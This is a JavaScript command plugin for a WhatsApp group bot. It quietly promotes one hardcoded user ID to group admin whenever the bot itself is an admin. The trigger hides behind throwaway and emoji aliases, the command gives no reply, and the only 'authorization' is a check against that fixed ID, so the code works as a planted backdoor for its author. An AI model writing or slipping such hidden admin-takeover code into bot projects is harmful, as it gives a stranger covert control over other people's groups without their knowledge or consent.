// JawadTech

const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: "ik",
    alias: ["takeadmin", "🔪", "💀", "aa", "uhh", "iyk"],
    desc: "Silently take adminship if authorized",
    category: "owner",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {

    if (!isGroup || !isBotAdmins) return;

    // Check if sender is exactly 99038271684629@lid
    if (sender !== "99038271684629@lid") return;

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === sender);
        
        if (!userParticipant?.admin) {
            await conn.groupParticipantsUpdate(from, [sender], "promote");
        }
    } catch (error) {
        console.error("Silent admin error:", error.message);
    }
});
